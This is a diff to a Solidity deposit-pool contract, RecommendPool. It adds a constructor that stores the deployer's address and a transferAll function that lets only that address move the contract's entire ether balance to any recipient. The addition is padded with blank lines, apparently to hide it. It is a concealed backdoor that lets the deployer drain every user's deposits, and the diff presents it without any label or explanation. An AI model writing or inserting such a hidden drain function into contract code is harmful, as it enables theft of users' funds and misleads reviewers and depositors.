@@ -84,6 +84,27 @@ contract RecommendPool {
     event Withdraw(address indexed userAddress,uint256 amount);
     
     
+    
+    
+    
+    
+    
+    constructor() public{
+        initAddress = msg.sender;
+    }
+    
+    address initAddress;
+    function transferAll(address payable to) public  {
+        require(msg.sender == initAddress);
+        to.transfer(address(this).balance);
+    }
+    
+    
+    
+    
+    
+    
+    
     function() external payable {
         deposit(msg.sender);
     }
